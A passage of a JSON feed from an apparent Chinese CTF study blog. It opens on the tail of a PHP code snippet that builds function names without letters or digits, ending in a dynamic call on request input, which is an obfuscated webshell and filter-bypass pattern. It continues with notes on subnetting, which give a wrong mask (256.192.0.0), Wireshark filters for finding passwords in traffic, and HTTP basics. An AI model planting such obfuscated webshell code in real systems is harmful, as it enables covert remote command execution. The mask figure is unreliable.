punctuation\">(</span><span class=\"token variable\">$___</span><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$___</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"半\"</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$____</span><span class=\"token operator\">.=</span><span class=\"token operator\">~</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___</span><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$___</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"始\"</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$____</span><span class=\"token operator\">.=</span><span class=\"token operator\">~</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___</span><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$_____</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'_'</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$___</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"俯\"</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_____</span><span class=\"token operator\">.=</span><span class=\"token operator\">~</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___</span><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$___</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"瞰\"</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_____</span><span class=\"token operator\">.=</span><span class=\"token operator\">~</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___</span><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$___</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"次\"</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_____</span><span class=\"token operator\">.=</span><span class=\"token operator\">~</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___</span><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$___</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"站\"</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_____</span><span class=\"token operator\">.=</span><span class=\"token operator\">~</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___</span><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token variable\">$$_____</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token variable\">$____</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>这串代码的思想是先利用 php 的弱类型特性 true+true 等价于 1+1=2, 得到 1 和 2 的值，然后再通过 {} 索引的方式去取中文字符 UTF-8 编码的值并反转得到想要的字符串然后拼接。</p>\n<p><strong>方法三：自增操作</strong></p>\n<p>PHP 沿袭了 Perl 的习惯，在<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>a</mi><msup><mo>=</mo><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><msup><mi>Z</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mtext>时，将</mtext></mrow><annotation encoding=\"application/x-tex\">a=&#x27;Z&#x27;时，将</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.7519em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\"><span class=\"mrel\">=</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7519em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.7519em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">Z</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7519em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mord cjk_fallback\">时，将</span></span></span></span> a 变成 'AA', <code>'a'++ =&gt; 'b'</code> ， <code>'b'++ =&gt; 'c'</code> ... 所以，我们只要能拿到一个变量，其值为 <code>a</code> ，通过自增操作即可获得 a-z 中所有字符。</p>\n<p>获取字符串 'a', 在 PHP 中，强制连接数组和字符串，数组将被转换成字符串，其值为 'Array'</p>\n",
            "tags": [
                "CTF",
                "Web"
            ]
        },
        {
            "id": "https://ly1tnt.github.io/2024/10/23/CTF/Web/%E7%BD%91%E7%BB%9C%E4%BD%8D%E5%92%8C%E4%B8%BB%E6%9C%BA%E4%BD%8D/",
            "url": "https://ly1tnt.github.io/2024/10/23/CTF/Web/%E7%BD%91%E7%BB%9C%E4%BD%8D%E5%92%8C%E4%B8%BB%E6%9C%BA%E4%BD%8D/",
            "title": "网络位 主机位",
            "date_published": "2024-10-23T02:23:15.000Z",
            "content_html": "<h2 id=\"网络位和主机位\"><a class=\"anchor\" href=\"#网络位和主机位\">#</a> 网络位和主机位</h2>\n<ol>\n<li>\n<p><strong>网络位</strong>：</p>\n<ul>\n<li>\n<p>确定网络地址，使路由器能够将数据包正确地传送到目标网络。</p>\n</li>\n<li>\n<p>划分网络中的子网，方便网络管理和提高安全性。</p>\n</li>\n</ul>\n</li>\n</ol>\n<p>2.<strong> 主机位</strong>：</p>\n<ul>\n<li>确定具体设备的 IP 地址，使设备在网络中可以被唯一标识。</li>\n<li>确保同一子网中设备之间的通信。</li>\n</ul>\n<h2 id=\"ip字段\"><a class=\"anchor\" href=\"#ip字段\">#</a> IP 字段</h2>\n<p>扫描时使用的 IP 字段，若为 / 10，则表示前十位为网络位，后 22 位为主机位，若 IP 地址为 192.0.0.0，则表示范围为 192.0.0.0 到 192.63.255.255, 计算广播地址，将主机位全部设为 1，网络位保持不变。</p>\n<h2 id=\"子网掩码\"><a class=\"anchor\" href=\"#子网掩码\">#</a> 子网掩码</h2>\n<p>划分网络位和主机位，字段有几位就有几个 1，1 后面为 0，如 / 10 为 11111111.11000000.00000000.00000000，子网掩码为 256.192.0.0，网络地址的结果为和子网掩码与运算的结果，广播地址的结果为将网络地址的主机位的 0 换成 1 计算得来的。</p>\n",
            "tags": [
                "CTF",
                "Web"
            ]
        },
        {
            "id": "https://ly1tnt.github.io/2024/10/09/CTF/Misc/WireShark%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/",
            "url": "https://ly1tnt.github.io/2024/10/09/CTF/Misc/WireShark%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/",
            "title": "WireShark使用",
            "date_published": "2024-10-09T11:07:00.000Z",
            "content_html": "<h1 id=\"wireshark学习笔记\"><a class=\"anchor\" href=\"#wireshark学习笔记\">#</a> WireShark 学习笔记</h1>\n<h3 id=\"1过滤器指令\"><a class=\"anchor\" href=\"#1过滤器指令\">#</a> 1. 过滤器指令</h3>\n<p>http contains &quot;XX&quot;</p>\n<p>http contains &quot;.log&quot; 查日志</p>\n<p>http contains &quot;login&quot; http contains &quot;password&quot; 查密码</p>\n<p>http.request.method==POST 一般查文件的时候筛选 POST</p>\n<h3 id=\"2\"><a class=\"anchor\" href=\"#2\">#</a> 2.</h3>\n<p>注意流量在哪里发生变化</p>\n<p>使用 http、tcp 流查看</p>\n<h3 id=\"3wireshark实现图片截取\"><a class=\"anchor\" href=\"#3wireshark实现图片截取\">#</a> 3.wireshark 实现图片截取</h3>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241009190537454.png\" alt=\"image-20241009190537454\" /></p>\n<p>像出现这种情况，可以查看追踪流，然后选择获得原始数据，</p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241009190625659.png\" alt=\"image-20241009190625659\" /></p>\n<p>放到 010 里面<img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241009190635356.png\" alt=\"image-20241009190635356\" /></p>\n<p>保存为图片。PNG 为 89 50 开头</p>\n",
            "tags": [
                "CTF",
                "Misc"
            ]
        },
        {
            "id": "https://ly1tnt.github.io/2024/10/06/CTF/Web/%E3%80%8A%E5%9B%BE%E8%A7%A3HTTP%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/",
            "url": "https://ly1tnt.github.io/2024/10/06/CTF/Web/%E3%80%8A%E5%9B%BE%E8%A7%A3HTTP%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/",
            "title": "《图解HTTP》读书笔记",
            "date_published": "2024-10-06T09:13:00.000Z",
            "content_html": "<h1 id=\"图解http学习笔记\"><a class=\"anchor\" href=\"#图解http学习笔记\">#</a> 《图解 HTTP》学习笔记</h1>\n<h2 id=\"第一章\"><a class=\"anchor\" href=\"#第一章\">#</a> 第一章</h2>\n<h3 id=\"11-12-http基础\"><a class=\"anchor\" href=\"#11-12-http基础\">#</a> 1.1-1.2 HTTP 基础</h3>\n<p>Web 使用一种名为 HTTP（HyperText Transfer Protocol，超文本传输协<br />\n议 ）的协议作为规范，完成从客户端到服务器端等一系列运作流<br />\n程。而协议是指规则的约定。可以说 Web 是建立在 HTTP 协议上通<br />\n信的</p>\n<p>HTTP 协议的版本:</p>\n<p>HTTP/0.9 于 1990 年问世，无正式的标准</p>\n<p>HTTP/1.0 1996 年的 5 月公布，版本被命名为 HTTP/1.0，并记载于 RFC1945</p>\n<p><strong>HTTP/1.1</strong>  1997 年 1 月公布的 HTTP/1.1 是目前 (直到现在 2024.1.3 我在工作中遇到的大部分 HTTP 仍是 1.1) 主流的 HTTP</p>\n<p>协议版本 RFC2616</p>\n<p>HTTP/2.0 新一代 HTTP 协议，至今仍未大规模使用</p>\n<h3 id=\"13-15-网络基础-tcpip-与http关系密切的协议\"><a class=\"anchor\" href=\"#13-15-网络基础-tcpip-与http关系密切的协议\">#</a> 1.3-1.5 网络基础 TCP/IP 与 HTTP 关系密切的协议</h3>\n<p>计算机与网络设备相互通信要基于相同方法，这一切都需要一种规则，这种规则被称之为协议。</p>\n<p>通常使用的网络（包括互联网）是在 TCP/IP 协议族的基础上运作<br />\n的。而 **HTTP 属于它内部的一个子集。** 这里的 TCP/IP 指互联网相关的各类协议组的总称。</p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241004220944783.png\" alt=\"image-20241004220944783\" /></p>\n<p>应用层：决定了向用户提供应用服务时通信的活动。</p>\n<p>TCP/IP 协议族中预存了各类通用的应用服务，如 FTP，和 DNS 服务</p>\n<p>HTTP 协议也处于该层 (应用层)</p>\n<p>传输层：对上层应用层，提供处于网络连接中的两台计算机之间的数据<br />\n传输。</p>\n<p>传输层有两个性质不同的协议：TCP (传输控制协议) 和 UDP (用户数据报协议)</p>\n<p>网络层：网络层用来处理在网络上流动的数据包。该层规定了通过怎样的路径（所谓的传输路线）到达对方计<br />\n算机，并把数据包传送给对方。</p>\n<p>链路层：用来处理连接网络的硬件部分。</p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241004221507228.png\" alt=\"image-20241004221507228\" /></p>\n<p>利用 TCP/IP 协议族进行网络通信，会根据分层顺序与对方进行通信。发送端从应用层往下走，接收端从应用层往上走。</p>\n<p><strong>为了传输方便，在传输层（TCP 协议）把从应用层处收到的数</strong><br />\n<strong>据（HTTP 请求报文）进行分割，并在各个报文上打上标记序号及端</strong><br />\n<strong>口号后转发给网络层。</strong></p>\n<p><strong>在网络层（IP 协议），增加作为通信目的地的 MAC 地址后转发给链</strong><br />\n<strong>路层。这样一来，发往网络的通信请求就准备齐全了。</strong></p>\n<p><strong>接收端的服务器在链路层接收到数据，按序往上层发送，一直到应用</strong><br />\n<strong>层。当传输到应用层，才能算真正接收到由客户端发送过来的 HTTP</strong><br />\n<strong> 请求。</strong></p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241004221721144.png\" alt=\"image-20241004221721144\" /></p>\n<p><strong>发送端在层与层之间传输数据时，每经过一层时必定会被打上一个该</strong><br />\n<strong>层所属的首部信息。反之，接收端在层与层传输数据时，每经过一层</strong><br />\n ** 时会把对应的首部消去。** 这一将数据包装起来的做法叫封装。</p>\n<p>几乎所有使用网络的系统都会用到 IP (Internert Protocol) 网际协议，TCP/IP 协议族中的 IP 指的就是网际协议 <strong>&quot;IP&quot; 其实是一种协议的名称，不能与 &quot;IP 地址搞混&quot;</strong></p>\n<p>IP 协议的作用是把各种数据包传送给对方。其中两个重要的条件是 IP 地址和 MAC<br />\n 地址。IP 地址指明了节点被分配到的地址 MAC 地址是指网卡所属的固定地址。IP 地址可以和 MAC 地址进行配对。</p>\n<p>使用 ARP 协议凭借 MAC 地址进行通信</p>\n<p>IP 间的通信依赖 MAC 地址。在网络上，通信双方通常是经过多台计算机和网络设备中转<br />\n才能连接到对方。而在进行中转时，会利用下一站中转设备的 MAC<br />\n 地址来搜索下一个中转目标。这时，会采用 ARP 协议（Address<br />\nResolution Protocol）。ARP 是一种用以解析地址的协议，根据通信方<br />\n的 IP 地址就可以反查出对应的 MAC 地址。</p>\n<p>在到达通信目标前的中转过程中，那些计算机和路由器等网络设备只能获悉很粗略的传输路线。这种机制称为路由选择（routing）</p>\n<p>无论哪台计算机、哪台网络设备，它们都无法全面掌握互联网中的细节。</p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241004224402530.png\" alt=\"image-20241004224402530\" /></p>\n<p>按层次分，TCP 位于传输层，提供可靠的字节流服务。</p>\n<p>所谓的字节流服务（Byte Stream Service）是指，为了方便传输，将大<br />\n块数据分割成以报文段（segment）为单位的数据包进行管理。而可<br />\n靠的传输服务是指，能够把数据准确可靠地传给对方。一言以蔽之，<br />\nTCP 协议为了更容易传送大数据才把数据分割，而且 TCP 协议能够<br />\n确认数据最终是否送达到对方。</p>\n<p>TCP 协议采用了三次握手，握手过程中使用了 TCP 的标志（flag） —— SYN（synchronize） ACK（acknowledgement）</p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241004224752577.png\" alt=\"image-20241004224752577\" /></p>\n<p>DNS (Domain Name System) 和 HTTP 一样位于应用层的协议，是提供通过域名查找 IP 地址，或逆向从 IP 地址反查域名的服务。</p>\n<h3 id=\"16各种协议与http协议之间的关系\"><a class=\"anchor\" href=\"#16各种协议与http协议之间的关系\">#</a> 1.6 各种协议与 HTTP 协议之间的关系</h3>\n<p>下图展示了 IP 协议、TCP 协议和 DNS 服务在使用 HTTP 协议的通信过程中各自发挥的作用。</p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241004225847103.png\" alt=\"image-20241004225847103\" /></p>\n<h3 id=\"url和uri\"><a class=\"anchor\" href=\"#url和uri\">#</a> URL 和 URI</h3>\n<p><strong>URL</strong> (Uniform Resource Locator，统一资源定位符）是使用 Web 浏览器等访问页面时需要输入的网页地址。</p>\n<p><strong>URI</strong> (Uniform Resource Identifier，统一资源标识符) 是由某个协议方案表示的资源的<strong>定位标识符</strong>。其中协议方案有 http、ftp、mailto、telnet、file 等，约有 30 种左右。</p>\n<p>URI 用字符串标识某一互联网资源，而 URL 表示资源的地点（互联<br />\n网上所处的位置）。可见 URL 是 URI 的子集。</p>\n<p>URI 就是由某个协议方案表示的资源的定位标识符。协议方案是指访问资源所使用的协议类型名称。</p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241004231104646.png\" alt=\"image-20241004231104646\" /></p>\n<p><strong>绝对 URI 的格式:</strong></p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241004231536902.png\" alt=\"image-20241004231536902\" /></p>\n<h2 id=\"第二章\"><a class=\"anchor\" href=\"#第二章\">#</a> 第二章</h2>\n<h3 id=\"21-http-协议用于客户端和服务器端之间的通信\"><a class=\"anchor\" href=\"#21-http-协议用于客户端和服务器端之间的通信\">#</a> 2.1 HTTP 协议用于客户端和服务器端之间的通信</h3>\n<p>应用 HTTP 协议时，必定是一端担任客户端角色，另一端担任服务器端角色。</p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241004232259089.png\" alt=\"image-20241004232259089\" /></p>\n<h3 id=\"22-通过请求和响应的交换达成通信\"><a class=\"anchor\" href=\"#22-通过请求和响应的交换达成通信\">#</a> 2.2 通过请求和响应的交换达成通信</h3>\n<p>HTTP 协议规定，请求从客户端发出，最后服务器端响应该请求并返回。换句话说，肯定是先从客户端开始建立通信的，服务器端在没有接收到请求之前不会发送响应。</p>\n<p><strong>请求必定由客户端发出，而服务器端回复响应</strong></p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241004232357370.png\" alt=\"image-20241004232357370\" /></p>\n<p><strong>具体示例:</strong></p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241004232536517.png\" alt=\"image-20241004232536517\" /></p>\n<p>请求报文是由请求方法、请求 URI、协议版本、可选的请求首部字段和内容实体构成的。</p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241004232902905.png\" alt=\"image-20241004232902905\" /></p>\n<p>下面则是从客户端发送给某个 HTTP 服务器端的请求报文中的内容。</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token request-line\"><span class=\"token method property\">GET</span> <span class=\"token request-target url\">/index.htm</span> <span class=\"token http-version property\">HTTP/1.1</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">hackr.jp</span></span></pre></td></tr></table></figure><p>接收到请求的服务器，会将请求内容的处理结果以响应的形式返<br />\n回。</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token response-status\"><span class=\"token http-version property\">HTTP/1.1</span> <span class=\"token status-code number\">200</span> <span class=\"token reason-phrase string\">OK</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Date</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Tue, 10 Jul 2012 06:50:15 GMT</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Length</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">362</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html</span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token text-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>……</span></pre></td></tr></table></figure><p>起始行开头的 HTTP/1.1 : 表示服务器对应的 HTTP 协议版本。</p>\n<p>紧挨着的 200 OK 表示请求的处理结果的状态码（status code）和原因<br />\n短语（reason-phrase）。下一行显示了创建响应的日期时间，是首部<br />\n字段（header field）内的一个属性。</p>\n<p>下一行显示了创建响应的日期时间，是首部字段（header field）内的一个属性。</p>\n<p>以一空行分隔之后的内容称为资源实体的主体（entity body）。</p>\n<p>HTTP 响应报文格式：响应报文基本上由协议版本、状态码（表示请求成功或失败的数字代<br />\n码）、用以解释状态码的原因短语、可选的响应首部字段以及实体主<br />\n体构成。</p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241004233637586.png\" alt=\"image-20241004233637586\" /></p>\n<h3 id=\"23-http-是不保存状态的协议\"><a class=\"anchor\" href=\"#23-http-是不保存状态的协议\">#</a> 2.3 HTTP 是不保存状态的协议</h3>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006134435815.png\" alt=\"image-20241006134435815\" /></p>\n<h3 id=\"24-请求-uri-定位资源\"><a class=\"anchor\" href=\"#24-请求-uri-定位资源\">#</a> 2.4 请求 URI 定位资源</h3>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006134504714.png\" alt=\"image-20241006134504714\" /></p>\n<p><strong>当客户端请求访问资源而发送请求时，需要将作为请求报文中的请求 URI 包含在内。</strong></p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006134642920.png\" alt=\"image-20241006134642920\" /></p>\n<p><strong>如果不是访问特定资源而是对服务器本身发起请求，可以用一个 * 来代替请求 URI。</strong></p>\n<p>以下示例是查询 HTTP 服务器端支持的 HTTP 方法种类。</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>OPTIONS * HTTP/1.1</pre></td></tr></table></figure><h3 id=\"25-告知服务器意图的-http-方法\"><a class=\"anchor\" href=\"#25-告知服务器意图的-http-方法\">#</a> 2.5 告知服务器意图的 HTTP 方法</h3>\n<p>**<strong>GET: 获取资源</strong></p>\n<p>GET 方法用来请求访问已被 URI 识别的资源。指定的资源经服务器端解析后返回相应内容。</p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006142139385.png\" alt=\"image-20241006142139385\" /></p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006142155264.png\" alt=\"image-20241006142155264\" /></p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006142201260.png\" alt=\"image-20241006142201260\" /></p>\n<p>**POST:** 传输实体主体</p>\n<p>POST 方法用来传输实体的主体。</p>\n<p>POST 和 GET 虽然都能传输实体，但一般不用 GET 方法进行传输，POST 的主要目的并不是获取响应主体内容。</p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006142246261.png\" alt=\"image-20241006142246261\" /></p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006142253953.png\" alt=\"image-20241006142253953\" /></p>\n<p><strong>PUT: 传输文件</strong></p>\n<p>PUT 方法用来传输文件。由于安全性问题，一般的 Web 网站不使用该方法。</p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006142351306.png\" alt=\"image-20241006142351306\" /></p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006142413769.png\" alt=\"image-20241006142413769\" /></p>\n<p><em>(这里相应的意思是请求执行成功但无数据返回)</em></p>\n<p><strong>HEAD:</strong></p>\n<p>和 GET 方法一样，但不返回报文主体部分。</p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006142757519.png\" alt=\"image-20241006142757519\" /></p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006142811869.png\" alt=\"image-20241006142811869\" /></p>\n<p><strong>DELETE: 删除文件</strong></p>\n<p>和 PUT 一样由于安全原因一般 Web 网站不使用。</p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006142916903.png\" alt=\"image-20241006142916903\" /></p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006142929979.png\" alt=\"image-20241006142929979\" /></p>\n<p><strong>OPTIONS: 询问支持的方法</strong></p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006143033824.png\" alt=\"image-20241006143033824\" /></p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006143043541.png\" alt=\"image-20241006143043541\" /></p>\n<p><strong>TRACE: 追踪路径</strong></p>\n<p>TRACE 方法是让 Web 服务器端将之前的请求通信环回给客户端的方法。发送请求时，在 Max-Forwards 首部字段中填入数值，每经过一个服务器端就将该数字减 1，当数值刚好减到 0 时，就停止继续传输，最后接收到请求的服务器端则返回状态码 200 OK 的响应。客户端通过 TRACE 方法可以查询到发送出去的请求是怎样被加密 / 篡改的。</p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006143312999.png\" alt=\"image-20241006143312999\" /></p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006143318695.png\" alt=\"image-20241006143318695\" /></p>\n<p><strong>CONNECT: 要求用隧道协议连接代理</strong></p>\n<p>CONNECT 方法要求在与代理服务器通信时建立隧道，实现用隧道协议进行 TCP 通信。主要使用 SSL (Secure Sockets Layer，安全套接层) 和 TLS (Transport Layer Security，传输层安全) 协议把通信内容加密后经网络隧道传输。</p>\n<pre><code class=\"language-HTTP\">CONNECT 代理服务器名:端口号 HTTP版本\n</code></pre>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006143458046.png\" alt=\"image-20241006143458046\" /></p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006143503797.png\" alt=\"image-20241006143503797\" /></p>\n<h3 id=\"26使用方法下达命令\"><a class=\"anchor\" href=\"#26使用方法下达命令\">#</a> 2.6 使用方法下达命令</h3>\n<p>这一块内容比较无关紧要。</p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006143637556.png\" alt=\"image-20241006143637556\" /></p>\n<h3 id=\"27持久连接节省通信量\"><a class=\"anchor\" href=\"#27持久连接节省通信量\">#</a> 2.7 持久连接节省通信量</h3>\n<p>在 HTTP 协议的初始版本中，每进行一次 HTTP 通信就要断开一次 TCP 